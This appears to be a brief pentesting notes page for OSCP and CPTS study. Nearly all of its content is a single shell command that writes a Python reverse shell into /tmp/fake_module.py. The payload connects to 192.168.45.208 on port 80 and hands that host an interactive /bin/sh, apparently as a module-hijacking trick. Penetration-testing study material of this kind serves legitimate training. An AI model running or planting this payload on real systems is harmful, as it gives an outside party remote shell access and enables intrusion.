# OSCP
OSCP Certified | Sharing OSCP + CPTS notes &amp; pentesting resources

echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.45.208',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /tmp/fake_module.py
